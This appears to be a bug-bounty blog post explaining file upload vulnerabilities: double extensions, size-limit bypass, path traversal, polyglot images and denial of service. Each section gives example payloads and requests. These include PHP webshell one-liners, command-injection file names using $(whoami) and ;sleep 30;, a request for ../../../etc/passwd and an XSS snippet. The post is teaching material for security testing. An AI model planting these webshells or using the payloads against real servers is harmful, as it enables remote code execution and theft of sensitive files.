---
title: <img width="50" height="50" alt="img" src="https://github.com/thelocalh0st/thelocalh0st.github.io/assets/95465072/72322038-9495-47ba-bf30-0caa7c1a7968"> File Upload Vulnerabilities 🗃️ 
date: 2024-01-16 07:00:02 +730
categories: [Resources, bugbounty]
tags: [fileupload-vulnerability,bug-bounty,cybersecurity] # TAG names should always be lowercase
mermaid: true

---


<!-- <h1 style="color: cyan; text-align: center">100 Day's Of Cybersecurity - Day 16</h1> -->


![File-Upload-Vulnerability-2760290964](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/95465072/72322038-9495-47ba-bf30-0caa7c1a7968){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }





# 1. Unrestricted File Type Upload:


Allowing users to upload files without proper validation can lead to the execution of malicious scripts. An attacker may upload a file with a double extension, such as "malicious.php.jpg," tricking the system into treating it as an image file while executing PHP code.

**Example Payloads:**
```php
<?php echo passthru($_GET['cmd']); ?>
```

```php
<?php echo exec($_POST['cmd']); ?>
```
```php
<?php system($_GET['cmd']); ?>
```
```php
<?php passthru($_REQUEST['cmd']); ?>
```

**Request Snippet:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="file"; filename="malicious.php.jpg"
Content-Type: image/jpeg

...binary data of the image...
```

# 2. File Size Limit Bypass:


Attackers can attempt to bypass file size restrictions by compressing files or splitting them into smaller parts. This may allow them to upload content exceeding the specified limits.

**Example Payload:**
```bash
# Splitting a file into parts
split -b 1M largefile.txt part
```

**Request Snippet:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="file"; filename="part1"
Content-Type: text/plain

...binary data of part 1...

POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="file"; filename="part2"
Content-Type: text/plain

...binary data of part 2...
```

# 3. Malicious File Content:


Attackers may manipulate file content to include malicious scripts or payloads, exploiting vulnerabilities in server-side processing.

**Example Payload:**
```html
<script>alert('XSS Attack');</script>
```

**Request Snippet:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="file"; filename="malicious.html"
Content-Type: text/html

<script>alert('XSS Attack');</script>
```

# 4. Path Traversal Attacks:


Path traversal vulnerabilities may allow attackers to upload files outside the intended directory, potentially gaining unauthorized access to sensitive information.

> The restrication may not be in the previous directory ! 😜 


**Example Payload:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="file"; filename="../sensitivefile.txt"
Content-Type: text/plain

...binary data of the file...
```

# Remote Command Execution (RCE) via File Name Parameter

If the application includes custom image processing or file manipulation, it may be susceptible to remote command execution through code injection in the file name.

## Example Valid File Names and Payloads:

| File Name            | Payload        | Outcome if Vulnerable  |
|----------------------|----------------|------------------------|
| a$(whoami)z.jpg      | $(whoami)      | a[CURRENT USER]z.jpg   |
| a\`whoami\`z.jpg     | \`whoami\`     | a[CURRENT USER]z.jpg   |
| a;sleep 30;z.jpg     | ;sleep 30;     | The application will take 30+ seconds to respond |



# 5. Denial of Service (DoS) through File Uploads:


Attackers may overwhelm the server by uploading a large number of files simultaneously.

**Example Payload:**
```bash
# Generating a large file
dd if=/dev/zero of=largefile.txt bs=1M count=100
```

**Request Snippet:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="file"; filename="largefile.txt"
Content-Type: application/octet-stream

...binary data of the large file...
```

# 6. Image-Based Attacks (Polyglot):


Exploiting vulnerabilities in image processing libraries to execute arbitrary code.

<iframe width="560" height="315" src="https://www.youtube.com/embed/uGk5_yDbSeQ?si=BKDXh1Xh7H_pMhkb" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

> simple way to achive this is using exiftool and embed the php webshell via comeents
{: .prompt-info }


**Example Payload (Image with Embedded Malicious Code):**
```bash
# Embedding malicious code in an image
echo -n '<?php system("ls -la"); ?>' >> malicious.jpg
```

**Request Snippet:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="file"; filename="malicious.jpg"
Content-Type: image/jpeg

...binary data of the image...
```

# 7. Insecure Direct Object References (IDOR):

**Vulnerability Description:**
File upload functionalities may introduce IDOR vulnerabilities, allowing attackers to manipulate file references.

**Example Payload:**
```http
GET /download?file=../../../etc/passwd HTTP/1.1
```

In this case, an attacker manipulates the file parameter to access sensitive files.

These examples illustrate the technical aspects of common file upload vulnerabilities and highlight the importance of implementing robust security measures to protect against them. Always validate, sanitize, and restrict file uploads to ensure the integrity and security of your web application.



![](https://media.giphy.com/media/DAtJCG1t3im1G/giphy.gif)
